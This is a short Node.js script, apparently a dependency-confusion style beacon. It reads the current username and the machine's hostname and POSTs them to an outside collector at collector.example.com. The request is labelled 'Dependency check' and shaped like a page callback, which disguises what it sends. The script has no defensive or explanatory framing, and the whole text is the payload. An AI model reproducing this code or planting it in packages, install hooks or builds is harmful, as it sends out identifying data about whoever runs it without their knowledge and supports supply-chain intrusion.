const os = require("os");

const username = os.userInfo().username;
const hostname = os.hostname();
fetch("https://collector.example.com/page_callback", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    uri: `Dependency check: ${username}`,
    html: `Hostname: ${hostname}`
  })
});
